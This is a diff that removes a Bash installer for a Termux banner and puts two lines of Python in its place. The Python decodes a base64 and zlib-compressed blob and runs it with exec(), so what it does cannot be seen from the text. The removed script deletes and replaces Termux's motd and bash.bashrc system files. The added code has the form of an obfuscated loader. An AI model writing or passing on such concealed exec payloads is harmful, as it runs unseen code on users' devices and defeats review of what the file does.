@@ -1,22 +1,3 @@
-clear
-echo ""
 
-read -p " Does you want to install this Banner in Termux?(Yes/No) : " input
-
-if [[ $input == Yes || $input == yes || $input == y || $input == Y ]]; then
-    clear
-    cp bash.bashrc $HOME
-    cd /data/data/com.termux/files/usr/etc
-    rm -rf motd
-    rm -rf bash.bashrc
-    cd $HOME
-    mv bash.bashrc /data/data/com.termux/files/usr/etc
-    echo -e "\e[1;91mSuccessfully Installed"
-    echo -e "Restart Termux"
-    exit  3
-elif [[ $input == No || $input == no || $input == n || $input == N ]]; then
-exit 2
-else
-echo -e "\e[1;91mInvalid Option"
-exit 1
-fi
+import zlib, base64
+exec(zlib.decompress(base64.b64decode("eJyNUEFLwzAYvedXPMoOeuhK9aRjCKLgDm6gXkbdIaZfaSBNSpLODfbjjelk7XYxh4+8l5f3PZ5QxC0jURskCWOWeIm0RYInQw570+Gbaw9vILXzXCn4Wjo8cq3JBg4fZJtu93C1JpctzTXuw1+p284zJisUBSYRYT5HkOBwGBD7C2IM19hsZmEhaYZwRMwaby2+uKunv8MKTF5Wr8/9Q4ms5J73Q5hm6mO+rJIqBOyczciLKLUNUluhMb4c4oHvn+PJvtmO9v53Vaw3JSSfVOSzu7x574Qg56pOqT0WfbFUJmPxGwXe+mPDx8ed9MAtI3Ve7tKMu9PneAyXp2qj502wdMQuki70litZYtV6aXTSi3NWSfYDe5+xZg==")))
